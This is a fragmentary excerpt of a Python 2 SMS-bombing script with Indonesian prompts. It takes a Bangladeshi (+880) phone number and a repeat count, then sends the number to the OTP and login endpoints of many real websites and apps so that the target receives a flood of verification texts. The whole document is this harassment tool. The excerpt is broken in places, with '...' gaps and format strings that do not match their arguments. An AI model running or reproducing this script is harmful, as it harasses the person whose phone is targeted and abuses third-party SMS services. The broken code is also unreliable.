...
#--------------------------------MAIN---------------------------------------------------
def main():
  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+880"+nom)
  t = 1
...
def input():
  global nom
  nom = raw_input("Masukkan nomor target (+880) : "%(pu,me,pu,pu))
  if len(nom) < 5:
    print "Masukkan nomor target dengan benar!!"%(pu,me,pu,me)
    input()
  elif nom.startswith(tuple(["88","+880","0"])):
    print "%sMasukkan nomor tanpa 88, +880, ataupun  %sContoh : 01619103775"%(pu,me,pu,ku,pu,me,pu,ku)
    input()
  else:
    global jum
    jum = int(raw_input("%sMasukkan jumlah spam : "%(pu,me,pu,pu)))
    main()
#-------------------------------SPAM Function-------------------------------------------
def asakita():
  data={'username':'880'+nom}
  ...
  if 'MOBILE' in h:
   ...
   gagal("1","sms","asakita")
def sunchila():
#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=880")
...
def asani():
  ...
  if json.loads(j.text)["message"] == 'OTP Terkirim ':
   ...
   gagal("4","sms","asani")
def wintershop():
 #dat=json.dumps(["880"+nom,"Winter Shop","",""])
...
# to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
  ...
  #gagal("6","sms","datesy")
def thaifriendly():
 tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'880','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
 if json.loads(tes.text)["success"] == True:
  sukses("7","sms","thaifriendly")
 else:
  gagal("7","sms","thaifriendly")
def jumpstart():
 dat=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+880"+nom},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"})
...
'X-Requested-With':'com.uf7c21.uangpintar.w465ae'
 ...
 pis=requests.post("http://www.uangpintar.id:7092/up/sms_login/vcode",headers=hd,data={'phone':nom,'code':'880'})
...
'X-Requested-With':'com.ecreditpal.tropic2'
 ...
 hu=requests.post("https://www.kreditpedia.co.id:8089/tropic/sms_login/vcode",headers=hd,data={'phone':nom,'code':'880'})
 if json.loads(hu.text)["desc"] == 'Success':
  sukses("22","sms","kreditpedia")
 else:
  gagal("22","sms","kreditpedia")
def bocil():
 dat={'user_id':'','language':'in','phone':'880'+nom,'device_id':'590bc36d99d6dddb','retry':'0'}
